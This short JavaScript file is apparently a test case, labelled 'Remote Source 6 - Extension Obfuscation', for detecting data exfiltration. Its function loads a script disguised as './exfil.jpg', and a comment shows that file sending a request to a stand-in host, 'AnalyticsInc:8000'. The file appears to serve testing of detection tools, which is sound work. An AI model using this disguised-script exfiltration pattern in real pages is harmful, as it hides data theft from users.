function exfiltrate_key_history() {

    // Remote Source 6 - Extension Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL = './exfil.jpg';
    var script = document.createElement("script");
    script.src = URL;
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

/*
exfil.jpg contents:

xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=remote6", true);
xmlhttp.send(null);

*/
